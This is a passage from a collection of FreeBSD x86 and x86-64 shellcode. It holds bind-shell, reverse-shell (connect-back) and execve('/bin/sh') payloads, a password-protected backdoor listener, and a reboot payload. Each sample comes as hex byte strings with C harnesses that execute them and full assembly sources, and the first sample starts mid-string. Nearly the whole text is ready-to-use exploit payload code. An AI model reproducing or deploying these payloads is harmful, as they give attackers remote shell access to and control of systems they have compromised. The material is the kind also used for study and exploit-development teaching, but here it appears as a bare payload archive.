                    "\xf0\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89"
                    "\xe1\x52\x51\x53\xb0\x3b\x50\xcd\x80";

void change_shellcode(unsigned short port)
{
   *((unsigned short*)(shellcode + 18)) = htons(port);
}
void print_shellcode(void)
{
   int i;
   for(i = 0; i < sizeof(shellcode) - 1; i++)
   {
      printf("\\x%.2x", (unsigned char)shellcode[i]);
   }
   printf("\n");
}
int main(void)
{
   unsigned short port = 31337;

   change_shellcode(port);
   print_shellcode();
   printf("Shellcode len = %d bytes\n", sizeof(shellcode)-1);
   void (*f)() = (void*) shellcode;

   f();

   return 0;
}

/*
   section .text
      global _start

   _start:
      xor ecx, ecx
      mul ecx
      push ecx          
      inc eax
      push eax        
      inc eax
      push eax        
      push eax        
      mov al, 97        ; socket(AF_INET, SOCK_STREAM, 0)
      int 0x80
     
      xchg esi, eax    
     
      push edx          
      push word 0x3905  
      push word 0x0201
      mov ecx, esp    
     
      push byte 16      
      push ecx        
      push esi        
      push eax        
      mov al, 104       ; bind(sock, sockaddr*, sizeof(sockaddr))
      int 0x80
     
      xor eax, eax
      mov al, 5
      push eax
      push esi
      push eax
      mov al, 106       ; listen(sock, 5)
      int 0x80

   .ACCEPT:  
      xor eax, eax
      push eax
      push eax
      push esi
      push eax
      mov al, 30        ; accept(sock, 0, 0)
      int 0x80
     
      xchg edi, eax
     
      xor eax, eax
      push eax
      mov al, 2         ; fork()
      int 0x80
     
      or eax, eax      
      jz .ACCEPT
     
     
      xor ecx, ecx      ; dup2 STDERR, STDIN, STDOUT
   .L:
      xor eax, eax
      push ecx
      push edi
      push eax
      mov al, 90      
      int 0x80
      inc cl
      cmp cl, 3
      jne .L
     
      push edx        
      push '//sh'
      push '/bin'      
     
      mov ebx, esp      
      push edx          
      push ebx          
      mov ecx, esp      
      push edx          
      push ecx          
      push ebx          
      mov al, 59        ; execve("/bin//sh", ["/bin/sh", NULL], NULL)
      push eax          
      int 0x80
*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 -------------- FreeBSD/x86 - execv("/bin/sh") 23 bytes -------------------------
 *  AUTHOR : Tosh
 *   OS    : BSDx86 (Tested on FreeBSD 8.1)
 *   EMAIL : tosh@tuxfamily.org
 */

#include <string.h>
#include <stdio.h>



char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
                   "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
                   "\x54\x53\xb0\x3b\x50\xcd\x80";

int main(void)
{
   void(*f)() = (void*)shellcode;

   printf("Len = %d\n", sizeof(shellcode)-1);
   f();
}

/*!
 %define SYS_EXECV 59


section .text

global _start

_start:
   xor eax, eax

   push eax

   push '//sh'
   push '/bin'

   mov ebx, esp

   push eax
   push esp
   push ebx
   mov al, SYS_EXECV
   push eax
   int 0x80
*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 -------------- FreeBSD/x86 - connect back /bin/sh. 81 bytes ----------------
 *  AUTHOR : Tosh
 *   OS    : BSDx86 (Tested on FreeBSD 8.1)
 *   EMAIL : tosh@tuxfamily.org
 */

#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

char shellcode [] = "\x31\xc0\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2"
                    "\x68\x7f\x00\x00\x01\x66\x68\x05\x39\x66\x68\x01\x02\x89"
                    "\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x62\x50\xcd\x80\x31\xc9"
                    "\x51\x52\x31\xc0\xb0\x5a\x50\xcd\x80\xfe\xc1\x80\xf9\x03"
                    "\x75\xf0\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                    "\x6e\x89\xe3\x50\x54\x53\xb0\x3b\x50\xcd\x80";

void change_shellcode(const char *ip, unsigned short port)
{
   *((unsigned long*)(shellcode + 15)) = inet_addr(ip);
   *((unsigned short*)(shellcode + 21)) = htons(port);
}
void print_shellcode(void)
{
   int i;
   for(i = 0; i < sizeof(shellcode) - 1; i++)
   {
      printf("\\x%.2x", (unsigned char)shellcode[i]);
   }
   printf("\n");
}
int main(void)
{
   const char ip[] = "127.0.0.1";
   unsigned short port = 1337;

   change_shellcode(ip, port);
   print_shellcode();
   printf("Shellcode len = %d bytes\n", sizeof(shellcode)-1);
   void (*f)() = (void*) shellcode;

   f();

   return 0;
}

/*
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Syscalls nums, on /usr/src/sys/kern/syscalls.master ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

%define IPPROTO_TCP 6
%define SOCK_STREAM 1
%define AF_INET 2

%define SYS_EXECV 59
%define SYS_DUP2 90
%define SYS_SOCKET 97
%define SYS_CONNECT 98

section .text

global _start

_start:
   xor eax, eax
   ;;;;;;;;;;;;;;;;;;;;;;
   ; socket()
   ;;;;;;;;;;;;;;;;;;;;;;
   push eax
   push byte SOCK_STREAM
   push byte AF_INET

   mov al, SYS_SOCKET
   push eax
   int 0x80
   mov edx, eax

   ;;;;;;;;;;;;;;;;;;;;;;
   ; sockaddr_in
   ;;;;;;;;;;;;;;;;;;;;;;
   push 0x0100007f
   push word 0x3905
   push word 0x0201
   mov ecx, esp

   ;;;;;;;;;;;;;;;;;;;;;
   ; connect()
   ;;;;;;;;;;;;;;;;;;;;;
   push byte 16
   push ecx
   push edx
   xor eax, eax
   mov al, SYS_CONNECT
   push eax
   int 0x80

   ;;;;;;;;;;;;;;;;;;;;;
   ; dup2()
   ;;;;;;;;;;;;;;;;;;;;;
   xor ecx, ecx
.L:
   push ecx
   push edx
   xor eax, eax
   mov al, SYS_DUP2
   push eax
   int 0x80

   inc cl
   cmp cl, 3
   jne .L

   ;;;;;;;;;;;;;;;;;;;;;;
   ; execv("/bin/sh")
   ;;;;;;;;;;;;;;;;;;;;;;
   xor eax, eax

   push eax

   push '//sh'
   push '/bin'

   mov ebx, esp

   push eax
   push esp
   push ebx
   mov al, SYS_EXECV
   push eax
   int 0x80
 */




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
THE ZUGCODE - SMALL REMOTE 6ACKD0R
FreeBSD i386 bind shell with auth
code by MahDelin
Big thx SST [kaka, nolife, white]
Listen on the port 4883 the /bin/sh
*/

/*
void zugcode(void )
{
//socket
__asm__("xorl     %eax,  %eax");
__asm__("pushl    %eax");
__asm__("pushl    %eax");
__asm__("pushl    $0x01");
__asm__("pushl    $0x02");
__asm__("movl     %esp,  %ebp");
__asm__("pushl    %ebp");
__asm__("movb     $0x61, %al");
__asm__("int      $0x80");

//struct sockaddr_in
__asm__("movl     %eax,    %edi");
__asm__("xorl     %eax,    %eax");
__asm__("movb     $0x02,   9(%ebp)");
__asm__("movw     $0x1313, 10(%ebp)");
__asm__("movl     %eax,    12(%ebp)");
__asm__("leal     8(%ebp), %ecx");

//bind
__asm__("xor      %ebx,%ebx");
__asm__("movb     $0x10,%bl");
__asm__("push     %ebx");
__asm__("push     %ecx");
__asm__("push     %edi");
__asm__("push     %eax");
__asm__("movb     $0x68, %al");
__asm__("int      $0x80");

//listen
__asm__("xor      %eax, %eax");
__asm__("pushl    %eax");
__asm__("pushl    $0x01");
__asm__("pushl    %edi");
__asm__("pushl    %eax");
__asm__("movb     $0x6a, %al");
__asm__("int      $0x80");

//accept
__asm__("xor      %eax, %eax");
__asm__("push     %ebx");
__asm__("pushl    %eax");
__asm__("pushl    %eax");
__asm__("pushl    %edi");
__asm__("pushl    %eax");
__asm__("movb     $0x1e, %al");
__asm__("int      $0x80");

__asm__("mov      %eax, %esi");
__asm__("xor       %eax, %eax");
__asm__("pushl     $0x203a7465");
__asm__("pushl     $0x72636573");
__asm__("movl      %esp, %ebx");
__asm__("push      %eax");
__asm__("push      $0x8");
__asm__("pushl     %ebx");
__asm__("push      %esi");
__asm__("xor       %eax, %eax");
__asm__("push      %eax");
__asm__("movb     $0x65, %al");
__asm__("int      $0x80");

//rcev password
__asm__("xor      %eax, %eax");
__asm__("pushl    %ebp");
__asm__("movl     %esp, %ebp");
__asm__("movb     $0x20, %al");
__asm__("subl     %eax,  %esp");
__asm__("xor      %eax, %eax");
__asm__("push     %eax");
__asm__("mov      $0x80, %al");
__asm__("push     %eax");
__asm__("xor      %eax, %eax");
__asm__("push     %ebp");
__asm__("push     %esi");
__asm__("push     %eax");
__asm__("movb     $0x66, %al");
__asm__("int      $0x80");

//compare password
//save registers %esi, %edi
__asm__("mov     %edi, %ebx");
__asm__("mov     %esi, %edx");
__asm__("mov     %eax, %ecx");
__asm__(".word    0x50eb");
__asm__("pop      %esi");
__asm__("mov      %ebp,     %edi");
__asm__("repe    cmpsb");
__asm__(".word    0x4275");
__asm__("mov     %ebx, %edi");
__asm__("mov     %edx, %esi");

//dup2 stdin
__asm__("xorl     %eax,  %eax");
__asm__("pushl    %eax");
__asm__("pushl    %esi");
__asm__("pushl    %eax");
__asm__("movb     $0x5a, %al");
__asm__("int      $0x80");

//dup2 stdout
__asm__("xorl     %eax,  %eax");
__asm__("inc      %eax");
__asm__("pushl    %eax");
__asm__("pushl    %esi");
__asm__("xorl     %eax,  %eax");
__asm__("pushl    %eax");
__asm__("movb     $0x5a, %al");
__asm__("int      $0x80");

//dup2 stderr
__asm__("xorl     %eax,  %eax");
__asm__("add      $0x2,  %eax");
__asm__("pushl    %eax");
__asm__("pushl    %esi");
__asm__("xorl     %eax,  %eax");
__asm__("pushl    %eax");
__asm__("movb     $0x5a, %al");
__asm__("int      $0x80");

// /bin/sh
__asm__("xor      %ecx, %ecx");
__asm__("pushl    %ecx");
__asm__("pushl    $0x68732f2f");
__asm__("pushl    $0x6e69622f");
__asm__("movl     %esp, %ebx");
__asm__("pushl    %ecx");
__asm__("pushl    %ebx");
__asm__("movl     %esp, %edx");
__asm__("pushl    %ecx");
__asm__("pushl    %edx");
__asm__("pushl    %ebx");
__asm__("pushl    %ecx");
__asm__("movb     $0x3b, %al");
__asm__("int      $0x80");

//exit
__asm__("xorl     %eax,  %eax");
__asm__("inc      %eax");
__asm__("pushl    %eax");
__asm__("pushl    %eax");
__asm__("int      $0x80");

__asm__(".byte  0xe8");
__asm__(".long  0xffffffab");
__asm__(".asciz \"payhash\12\"");
}
*/

unsigned char zug[] =
"\x31\xc0\x50\x50\x6a\x01\x6a\x02\x89\xe5\x55\xb0\x61\xcd\x80\x89\xc7\x31"
"\xc0\xc6\x45\x09\x02\x66\xc7\x45\x0a\x13\x13\x89\x45\x0c\x8d\x4d\x08\x31"
"\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80\x31\xc0\x50\x6a\x01\x57\x50"
"\xb0\x6a\xcd\x80\x31\xc0\x53\x50\x50\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31"
"\xc0\x68\x65\x74\x3a\x20\x68\x73\x65\x63\x72\x89\xe3\x50\x6a\x08\x53\x56"
"\x31\xc0\x50\xb0\x65\xcd\x80\x31\xc0\x55\x89\xe5\xb0\x20\x29\xc4\x31\xc0"
"\x50\xb0\x80\x50\x31\xc0\x55\x56\x50\xb0\x66\xcd\x80\x89\xfb\x89\xf2\x89"
"\xc1\xeb\x50\x5e\x89\xef\xf3\xa6\x75\x42\x89\xdf\x89\xd6\x31\xc0\x50\x56"
"\x50\xb0\x5a\xcd\x80\x31\xc0\x40\x50\x56\x31\xc0\x50\xb0\x5a\xcd\x80\x31"
"\xc0\x83\xc0\x02\x50\x56\x31\xc0\x50\xb0\x5a\xcd\x80\x31\xc9\x51\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe2\x51\x52\x53\x51"
"\xb0\x3b\xcd\x80\x31\xc0\x40\x50\x50\xcd\x80\xe8\xab\xff\xff\xff\x70\x61"
"\x79\x68\x61\x73\x68\x0a";

main()
{
int (*zugcode)();
printf("shellcode len, %d bytes\n", strlen(zug));
zugcode = (int (*)()) zug;
(int)(*zugcode)();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 *
 * FreeBSD_x86-reboot-7b.c (Shellcode, reboot(RB_AUTOBOOT), 7 bytes)
 *
 * by IZ < guerrilla.sytes.net >
 *
 */


char shellcode[] =
"\x31\xc0"                  /* xor %eax,%eax */

"\x50"                      /* push %eax */
"\xb0\x37"                  /* mov $0x37,%al */
"\xcd\x80";                 /* int $0x80 */


void main()
{
     int*     ret;         

     ret = (int*) &ret + 2;

     printf("len %d\n",strlen(shellcode));

     (*ret) = (int) shellcode; 
}






////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 *
 * FreeBSD_x86-execve_sh-23b-iZ.c (Shellcode, execve /bin/sh, 23 bytes)
 *
 * by IZ <guerrilla.sytes.net>
 *
 */


char setreuidcode[] =

"\x31\xc0"                  /* xor %eax,%eax */
"\x50"                      /* push %eax */
"\x68\x2f\x2f\x73\x68"      /* push $0x68732f2f (//sh) */
"\x68\x2f\x62\x69\x6e"      /* push $0x6e69622f (/bin)*/

"\x89\xe3"                  /* mov %esp,%ebx */
"\x50"                      /* push %eax */
"\x54"                      /* push %esp */
"\x53"                      /* push %ebx */

"\x50"                      /* push %eax */
"\xb0\x3b"                  /* mov $0x3b,%al */
"\xcd\x80";                 /* int $0x80 */


void main()
{
     int*     ret;         

     ret = (int*) &ret + 2;

     printf("len %d\n",strlen(setreuidcode));

     (*ret) = (int) setreuidcode; 
} 





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * FreeBSD shellcode - execve /tmp/sh
 * 
 * Claes M. Nyberg 20020120
 *
 * < cmn@darklab.org >, < md0claes@mdstud.chalmers.se >
 */

/**********************************************************
void
main()
{
__asm__("
        xorl    %eax, %eax   # eax = 0
        pushl   %eax         # string ends with NULL
        pushl   $0x68732f2f  # push 'hs//' (//sh)
        pushl   $0x706d742f  # push 'pmt/' (/tmp)
        movl    %esp, %ebx   # ebx = argv[0] = string addr
        pushl   %eax         # argv[1] = NULL
        pushl   %ebx         # argv[0] = /bin//sh
        movl    %esp, %edx   # edx = &argv[0]
        
        pushl   %eax         # envp = NULL
        pushl   %edx         # &argv[0]
        pushl   %ebx         # *path = argv[0]
        pushl   %eax         # Dummy
        movb    $0x3b, %al   # al = 59 = execve
        int     $0x80        # execve(argv[0], argv, NULL)

        xorl    %eax, %eax   # eax = 0
        inc     %eax         # eax++
        pushl   %eax         # Exit value = 1
        pushl   %eax         # Dummy
        int     $0x80        # exit(1); (eax is 1 = execve)
    ");
}
************************************************************/

#include "stdio.h"
#include "string.h"

static char freebsd_code[] =
    "\x31\xc0"               /* xorl    %eax, %eax  */
    "\x50"                   /* pushl   %eax        */
    "\x68\x2f\x2f\x73\x68"   /* pushl   $0x68732f2f */
    "\x68\x2f\x74\x6d\x70"   /* pushl   $0x706d742f */
    "\x89\xe3"               /* movl    %esp, %ebx  */
    "\x50"                   /* pushl   %eax        */
    "\x53"                   /* pushl   %ebx        */
    "\x89\xe2"               /* movl    %esp, %edx  */
    "\x50"                   /* pushl   %eax        */     
    "\x52"                   /* pushl   %edx        */    
    "\x53"                   /* pushl   %ebx        */
    "\x50"                   /* pushl   %eax        */
    "\xb0\x3b"               /* movb    $0x3b, %al  */
    "\xcd\x80"               /* int     $0x80       */
    "\x31\xc0"               /* xorl    %eax, %eax  */
    "\x40"                   /* inc     %eax        */ 
    "\x50"                   /* pushl   %eax        */
    "\x50"                   /* pushl   %eax        */
    "\xcd\x80";              /* int     $0x80       */


static char _freebsd_code[] =
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x74\x6d\x70\x89\xe3\x50"
    "\x53\x89\xe2\x50\x52\x53\x50\xb0"
    "\x3b\xcd\x80\x31\xc0\x40\x50\x50"
    "\xcd\x80";

void
main(void)
{
	void (*code)() = (void *)freebsd_code;
	printf("strlen code: %d\n", strlen(freebsd_code));
	code();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

ELF - FreeBSD Execve /bin/sh - Anti-Debugging - i386/AMD64

c0d3_z3r0 < anderson_underground@hotmail.com ; andersonc0d3@gmail.com >

http://anderson.hacknroll.com
http://blog.hacknroll.com

\x7f\x45\x4c\x46\x01\x01\x01\x09\x00\x00\x00\x00\x00\x00\x00\x00
\x02\x00\x03\x00\x01\x00\x00\x00\x74\x80\x04\x08\x34\x00\x00\x00
\xa8\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00
\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08
\x00\x80\x04\x08\x8b\x00\x00\x00\x8b\x00\x00\x00\x05\x00\x00\x00
\x00\x10\x00\x00\x01\x00\x00\x00\x8c\x00\x00\x00\x8c\x90\x04\x08
\x8c\x90\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00
\x00\x10\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x44

c0d3labs# uname -p
i386
c0d3labs# perl -e 'print "\x7f\x45\x4c\x46\x01\x01\x01\x09\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x74\x80\x04\x08\x34\x00\x00\x00\xa8\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\x8b\x00\x00\x00\x8b\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x01\x00\x00\x00\x8c\x00\x00\x00\x8c\x90\x04\x08\x8c\x90\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x10\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x44"' > binary
c0d3labs# ./binary
# exit
c0d3labs# objdump -d binary
objdump: binary: File truncated
c0d3labs# gdb -q binary
"/usr/home/andersonc0d3/elf/binary": not in executable format: File truncated
(gdb) q
c0d3labs# file binary
binary: ELF 32-bit LSB executable, Intel 80386, version 1 (FreeBSD), statically linked, stripped
c0d3labs#

c0d3labs64# uname -p
amd64
c0d3labs64# perl -e 'print "\x7f\x45\x4c\x46\x01\x01\x01\x09\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x74\x80\x04\x08\x34\x00\x00\x00\xa8\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\x8b\x00\x00\x00\x8b\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x01\x00\x00\x00\x8c\x00\x00\x00\x8c\x90\x04\x08\x8c\x90\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x10\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x44"' > binary64
c0d3labs64# ./binary64
# exit
c0d3labs64#

*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Anderson Eduardo < c0d3_z3r0 >
Hack'n Roll
http://anderson.hacknroll.com
http://blog.hacknroll.com 
 
.section .text
.globl _start
_start:
 

        xor %rcx,%rcx
        jmp string
 
        main:
 
        popq %rsi
        movq %rsi,%rdi
 
        pushq %rsi
        pushq %rcx
        movq %rsp,%rsi
 
        movq %rcx,%rdx
        movb $0x3b,%al
        syscall
 
        string:
        callq main
        .string "/bin/sh"
 

*/
 
int main(void)
{
char shellcode[] =
"\x48\x31\xc9"
"\xeb\x10"
"\x5e"
"\x48\x89\xf7"
"\x56"
"\x51"
"\x48\x89\xe6"
"\x48\x89\xca"
"\xb0\x3b"
"\x0f\x05"
"\x48\xe8\xea\xff\xff\xff"
"\x2f"
"\x62"
"\x69"
"\x6e"
"\x2f"
"\x73\x68";
 
        (*(void (*)()) shellcode)();
 
//Hack'n Roll
 
return 0;
} 





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/** 
 *
 *   _   _            _            ____       _ _ 
 *  | | | | __ _  ___| | ___ __   |  _ \ ___ | | |
 *  | |_| |/ _` |/ __| |/ / '_ \  | |_) / _ \| | |
 *  |  _  | (_| | (__|   <| | | | |  _ < (_) | | |
 *  |_| |_|\__,_|\___|_|\_\_| |_| |_| \_\___/|_|_|
 *           [ http://www.hacknroll.com ]
 *
 * Description:
 *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes
 *
 *
 *
 * Authors:
 *    Maycon M. Vitali ( 0ut0fBound )
 *        Milw0rm .: http://www.milw0rm.com/author/869
 *        Page ....: http://maycon.hacknroll.com
 *        Email ...: maycon@hacknroll.com
 *
 *    Anderson Eduardo ( c0d3_z3r0 )
 *        Milw0rm .: http://www.milw0rm.com/author/1570
 *        Page ....: http://anderson.hacknroll.com
 *        Email ...: anderson@hacknroll.com
 * 
 * -------------------------------------------------------
 *   
 * amd64# gcc hacknroll.c -o hacknroll
 * amd64# ./hacknroll
 * # exit
 * amd64#
 *
 * -------------------------------------------------------
 */

const char shellcode[] =
        "\x48\x31\xc0"                               // xor    %rax,%rax
        "\x99"                                       // cltd
        "\xb0\x3b"                                   // mov    $0x3b,%al
        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
        "\x57"                                       // push   %rdi
        "\x48\x89\xe7"                               // mov    %rsp,%rdi
        "\x57"                                       // push   %rdi
        "\x52"                                       // push   %rdx
        "\x48\x89\xe6"                               // mov    %rsp,%rsi
        "\x0f\x05";                                  // syscall

int main(void)
{
        (*(void (*)()) shellcode)();
        return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
* Gitsnik, @dracyrys
* FreeBSD x86_64 bind_tcp with passcode, 127 bytes
* Passcode: R2CBw0cr
*/

C Source:

char code[] = \
"\x6a\x61\x58\x6a\x02\x5f\x6a\x01\x5e\x99"
"\x0f\x05\x48\x97\xba\xff\x02\xaa\xaa\x80"
"\xf2\xff\x52\x48\x89\xe6\x99\x04\x66\x80"
"\xc2\x10\x0f\x05\x04\x6a\x0f\x05\x04\x1e"
"\x48\x31\xf6\x99\x0f\x05\x48\x97\x6a\x03"
"\x58\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10"
"\x0f\x05\x48\xb8\x52\x32\x43\x42\x77\x30"
"\x63\x72\x57\x48\x8d\x3e\x48\xaf\x74\x08"
"\x48\x31\xc0\x48\xff\xc0\x0f\x05\x5f\x48"
"\x89\xd0\x48\x89\xfe\x48\xff\xce\xb0\x5a"
"\x0f\x05\x75\xf7\x99\x04\x3b\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54"
"\x5f\x52\x57\x54\x5e\x0f\x05";

Assembly Intel Source:

global _start

;
; Bindshell in 64 bit shellcode (written
; and tested on a FreeBSD 9.1 AMD64 OS)
;
; Author: Gitsnik
; Twitter: @dracyrys
; Passcode: R2CBw0cr
; 127 bytes
;

section .text

_start:
;
; int socket( 2, 1, 0 )
;
; socket will return a socket into rax
;
; 12 bytes
;
push byte 0x61
pop rax
push byte 0x02
pop rdi
push byte 0x01
pop rsi
cdq  ; rdx is null
syscall  ; socket( 2, 1, 0 )

;
; Swap our socket from RAX into RDI which is where
; the next few functions want it anyway
;
; xchg is 1 byte shorter than mov
;
; 2 bytes
xchg rdi, rax    ; socket in rdi for bind() rax is now 2

;
; bind( sockfd, *addr, addrlen )
;
; We need to set up our serv_addr (which we know is 0,port,2)
; So load it all into RAX and push that. Note that because we want
; 7 bytes but the register is 8, we pad 0xff onto the back and then
; xor it to null to line everything up.
;
; 20 bytes

mov edx, 0xaaaa02ff
xor dl, 0xff
push rdx
mov rsi, rsp     ; rsi points to our sockaddr *

cdq              ; reset RDX
add al, 0x66     ; bind() is 0x68 but rax is already 0x02
add dl, 0x10     ; 16 (sizeof)
syscall

;
; listen is 0x6a
;
; listen( sockfd, backlog )
;
; bind() returns 0 on success, so add al, RDI already points at our
; sockfd, and we don't care what's in backlog but because it's a
; stack pointer from a few lines back the number is sufficiently high
; that it doesn't matter.
;
; 4 bytes

add al, 0x6a
syscall

;
; accept( sockfd, 0, 0 )
;
; accept() will return a new sockfd for us.
;
; 8 bytes
;
add al, 0x1e
xor rsi, rsi
cdq
syscall

;
; read( socket, buffer, length )
;
; Calls should read:
; rax: syscall number (0x03 on FreeBSD)
; rdi: client socket
; rsi: buffer address
; rdx: read size (0xf)
;
; We take the returned sockfd ( client ) from rax and load it into rdi
; as our second argument. We set RAX to be 0x03, as this is the syscall
; ID (reference: /usr/include/sys/syscall.h)
;
; Set rsi to be rsp-0xf to give us 0xf bytes of space for a buffer
; and set dl to be our length. RDX is still null because of the cdq we
; did earlier.
;
; When we are finished RAX will be the number of bytes read from the socket
; RDI will be our client socket
; RSI will contain the pointer to our string for passcode comparison
; RDX will be 0x000000000000000F
;
; 16 bytes

xchg rdi, rax
push byte 0x03   ; 0x03 is read() in FreeBSD
pop rax
push rdx         ; Still null from cdq up top.
lea rsi, [rsp-0x10]
add dl, 0x10
syscall

;
; rsi has our string, rdi client socket
;
; 18 bytes
;
mov rax, 0x7263307742433252 ; Replace your 8 character passcode here.
push rdi                    ; save the socket
lea rdi, [rsi]
scasq
jz dup2setup

;
; Exit
;
; 8 bytes
;
xor rax, rax
inc rax
syscall

;
; Setup for dup2 loop
;
; 7 bytes
;
dup2setup:
pop rdi
mov rax, rdx    ; RDX is dl, 0x10 but otherwise 0x00
; so we can do this and then just correct
; in the dup2 loop.
mov rsi, rdi

;
; dup2 loop
;
; 9 bytes
dup2:
dec rsi
mov al, 0x5a
syscall
jnz dup2

;
; Now for the big one. Let's set up our execve()
;
; At this point RAX is 0 so just null out rdx
;
; We need rdx to be null for the 3rd argument to execve()
;
; 23 bytes
cdq

add al, 0x3b     ; execve()
mov rbx, 0x68732f2f6e69622f ; hs//nib/

; Argument one shell[0] = "/bin//sh"
push rdx     ; null
push rbx     ; hs//nib/

; We need pointers for execve()
push rsp     ; *pointer to shell[0]
pop rdi  ; Argument 1

; Argument two shell (including address of each argument in array)
push rdx     ; null
push rdi     ; address of shell[0]

; We need pointers for execve()
push rsp     ; address of char * shell
pop rsi      ; Argument 2

syscall



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
* Gitsnik, @dracyrys
* FreeBSD x86_64 execve, 28 bytes
*
*/

C source:
char code[] = \
"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb"
"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53"
"\x54\x5f\x52\x57\x54\x5e\x0f\x05";

Intel Assembly:

global _start

;
; 28 byte execve FreeBSD x86_64
;
; [gitsnik@bsd64]$ nasm -f elf64 shell.nasm -o shell.o
; [gitsnik@bsd64]$ ld -o shell shell.o
; [gitsnik@bsd64]$ ./shell
; $ exit
; [gitsnik@bsd64]$
;

section .text

_start:
xor rcx, rcx
mul rcx

add al, 0x3b     ; execve()
mov rbx, 0x68732f2f6e69622f ; hs//nib/

; Argument one shell[0] = "/bin//sh"
push rdx     ; null
push rbx     ; hs//nib/

; We need pointers for execve()
push rsp     ; *pointer to shell[0]
pop rdi      ; Argument 1

; Argument two shell (including address of each argument in array)
push rdx     ; null
push rdi     ; address of shell[0]

; We need pointers for execve()
push rsp     ; address of char * shell
pop rsi      ; Argument 2

syscall



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////





